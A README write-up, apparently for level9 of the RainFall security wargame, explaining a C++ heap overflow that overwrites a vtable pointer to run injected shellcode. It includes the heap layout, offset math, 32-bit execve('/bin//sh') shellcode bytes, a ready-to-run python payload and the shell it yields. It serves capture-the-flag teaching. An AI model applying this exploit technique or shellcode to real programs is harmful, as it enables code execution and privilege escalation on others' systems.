C'est le wargame RainFall, un exercice éducatif légal de sécurité informatique. Voici le README mis à jour !

---

# Level9 — C++ Heap Overflow / Vtable Hijack + Shellcode

## Vulnerability

The binary allocates two `N` objects on the heap. Each object has a **vtable pointer** at offset `+0` and data at offset `+4`. `setAnnotation()` copies `argv[1]` into the first object's data buffer using `memcpy()` with no bounds check. By overflowing into the second object, we **overwrite its vtable pointer**, then plant a fake vtable and shellcode inside the first object's data region.

---

## Heap Layout

```
0x804a008  [vtable ptr][... 104 bytes of data ...]   ← obj1 (108 bytes)
0x804a078  [vtable ptr][... 104 bytes of data ...]   ← obj2 (108 bytes)
```

```
obj1+0x00 = 0x804a008  ← vtable ptr (set by constructor)
obj1+0x04 = 0x804a00c  ← data starts here (memcpy writes here)
obj1+0x10 = 0x804a018  ← shellcode starts here !
```

---

## Virtual Call Mechanism

```asm
mov (%eax),%eax      ; eax = obj2
mov (%eax),%edx      ; edx = *obj2 = vtable ptr  ← we control this
call *%edx           ; calls first vtable entry
```

Two dereferences :

```
obj2 → vtable → function

step 1 : reads obj2[0]     = 0x804a00c  (our fake vtable address)
step 2 : reads *(0x804a00c) = 0x804a010  (first entry = shellcode address)
step 3 : jumps to 0x804a010             → shellcode !
```

---

## Why 0x804a00c and 0x804a010

```
0x804a00c = obj1+4  ← start of our payload
            first 4 bytes = fake vtable ptr = 0x804a010

0x804a010 = obj1+4+4 = obj1+8  ← where shellcode begins
            CPU reads 0x804a010 as function address
            jumps there → executes shellcode !
```

---

## Offset Calculation

```
obj1 data starts at : 0x804a00c  (memcpy destination = obj1+4)
obj2 vtable ptr at  : 0x804a078

distance = 0x804a078 - 0x804a00c = 0x6c = 108 bytes
```

Confirmed with cyclic pattern :

```gdb
(gdb) r Aa0Aa1...
; eax = 0x41366441 at SIGSEGV → offset = 108
```

---

## Payload Structure

```
[\x10\xa0\x04\x08]  [shellcode 24b]  [NOP * 80]  [\x0c\xa0\x04\x08]
  4 bytes             24 bytes         80 bytes     4 bytes
  ↑                   ↑                             ↑
  fake vtable entry   shellcode at                  overwrites obj2
  points to           0x804a010                     vtable ptr
  shellcode
  ←————————————————— 108 bytes ————————————————————→
```

### Byte by byte

```
bytes 0-3   : \x10\xa0\x04\x08  → fake vtable first entry = 0x804a010
              stored at 0x804a00c = our fake vtable location
bytes 4-27  : shellcode          → execve("/bin//sh")
              stored at 0x804a010 ← CPU jumps here !
bytes 28-107: \x90 * 80          → NOP sled
bytes 108-111: \x0c\xa0\x04\x08 → overwrites obj2 vtable ptr
               obj2[0] = 0x804a00c = our fake vtable
```

---

## Shellcode

```asm
\x31\xc0        xor eax, eax
\x99            cdq              ; edx = 0
\x50            push eax         ; null terminator
\x68\x2f\x2f\x73\x68  push "//sh"
\x68\x2f\x62\x69\x6e  push "/bin"
\x89\xe3        mov ebx, esp     ; ebx = "/bin//sh"
\x50            push eax
\x53            push ebx
\x89\xe1        mov ecx, esp     ; ecx = argv
\xb0\x0b        mov al, 11       ; execve syscall
\xcd\x80        int 0x80
```

---

## GDB Steps

```bash
# find obj1+4 address after memcpy
(gdb) b memcpy
(gdb) r <payload>
(gdb) finish
(gdb) i r $eax
# eax = 0x804a00c  ← start of our data
# shellcode at eax+4 = 0x804a010 ← fake vtable entry points here
```

---

## Final Payload

```bash
python -c "print(
  '\x10\xa0\x04\x08' +
  '\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' +
  '\x90' * 80 +
  '\x0c\xa0\x04\x08'
)" > /tmp/exploit

./level9 $(cat /tmp/exploit)
```

---

## Full Execution Flow

```
1. new N(5)  →  obj1 at 0x804a008
2. new N(6)  →  obj2 at 0x804a078
3. setAnnotation(argv[1])
   → memcpy(0x804a00c, payload, 112)
   → 0x804a00c : \x10\xa0\x04\x08  (fake vtable entry → shellcode)
   → 0x804a010 : shellcode
   → 0x804a078 : \x0c\xa0\x04\x08  (obj2 vtable overwritten)
4. call *%edx
   → edx = *obj2        = 0x804a00c  (fake vtable)
   → edx = *(0x804a00c) = 0x804a010  (shellcode address)
   → jumps to 0x804a010
5. shellcode → execve("/bin//sh") → shell !
```

---

## Result

```bash
./level9 $(cat /tmp/exploit)
$ whoami
bonus0    ← shell obtained !
```